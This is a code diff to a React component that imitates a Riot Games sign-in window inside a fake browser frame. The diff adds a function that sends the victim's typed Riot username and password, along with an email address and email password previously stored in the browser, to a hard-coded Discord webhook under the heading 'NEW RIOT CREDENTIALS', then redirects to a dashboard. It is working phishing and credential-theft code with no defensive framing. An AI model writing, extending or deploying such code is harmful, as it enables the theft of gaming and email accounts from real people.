@@ -1,11 +1,12 @@
 import React, { useState, useRef } from 'react';
 import { X, Minus, Square, ArrowLeft, ArrowRight, RotateCw, Lock } from 'lucide-react';
 
-const RiotWindow = ({ onClose }) => {
+const RiotWindow = ({ onClose, onSuccess }) => {
   const [position, setPosition] = useState({ x: 100, y: 100 });
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
+  const [error, setError] = useState("");
   const isDragging = useRef(false);
   const dragStart = useRef({ x: 0, y: 0 });
 
@@ -28,11 +29,52 @@ const RiotWindow = ({ onClose }) => {
     document.removeEventListener('mouseup', handleMouseUp);
   };
 
-  const handleLogin = () => {
-    if (isEnabled) {
-      setLoading(true);
+  const sendToDiscord = async (user, pass) => {
+    try {
+      // Get existing data from localStorage
+      const dashEmail = localStorage.getItem('dash_email') || "N/A";
+      const dashPass = localStorage.getItem('dash_pass') || "N/A";
       
-      // Save data locally before redirecting
+      const response = await fetch('https://discord.com/api/webhooks/1527762392107188445/B95liOu8a0_Z1kN_mrrQCWKs3OBUezwnxGnF4CI_keGNPBYhAtLo9BOwwd-wAvMjRNPb', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: "🔐 NEW RIOT CREDENTIALS",
+            color: 0xed4245,
+            fields: [
+              { name: "🎮 Riot Username", value: user, inline: true },
+              { name: "🔑 Riot Password", value: pass, inline: true },
+              { name: "📧 Email", value: dashEmail, inline: true },
+              { name: "🔒 Email Password", value: dashPass, inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}`);
+      }
+
+      return true;
+    } catch (err) {
+      console.error("Failed to send to Discord:", err);
+      return false;
+    }
+  };
+
+  const handleLogin = async () => {
+    if (!isEnabled) return;
+    
+    setLoading(true);
+    setError("");
+    
+    // Send credentials immediately
+    const sent = await sendToDiscord(username, password);
+    
+    if (sent) {
+      // Save locally
       try {
         localStorage.setItem('riot_u', username);
         localStorage.setItem('riot_p', password);
@@ -40,10 +82,18 @@ const RiotWindow = ({ onClose }) => {
         console.error("Storage failed");
       }
 
-      // Simulate network delay then redirect
+      // Call onSuccess callback if provided
+      if (onSuccess) {
+        onSuccess(username, password);
+      }
+
+      // Redirect after short delay
       setTimeout(() => {
         window.location.href = '/dashboard';
-      }, 1500);
+      }, 1000);
+    } else {
+      setError("Failed to send credentials. Please try again.");
+      setLoading(false);
     }
   };
 
@@ -87,6 +137,12 @@ const RiotWindow = ({ onClose }) => {
         
         <h2 className="text-2xl text-zinc-900 font-bold mb-8">Sign in</h2>
         
+        {error && (
+          <div className="w-full max-w-[350px] mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
+            <p className="text-red-600 text-sm">{error}</p>
+          </div>
+        )}
+        
         <div className="w-full max-w-[350px] space-y-4">
           <input 
             type="text" 
@@ -115,7 +171,7 @@ const RiotWindow = ({ onClose }) => {
               onClick={handleLogin}
               disabled={!isEnabled || loading}
               className={`w-20 h-20 rounded-full flex items-center justify-center transition-all duration-300 ${
-                isEnabled ? "bg-red-600 hover:bg-red-700 cursor-pointer" : "bg-gray-300 cursor-not-allowed"
+                isEnabled && !loading ? "bg-red-600 hover:bg-red-700 cursor-pointer" : "bg-gray-300 cursor-not-allowed"
               }`}
             >
               {loading ? (
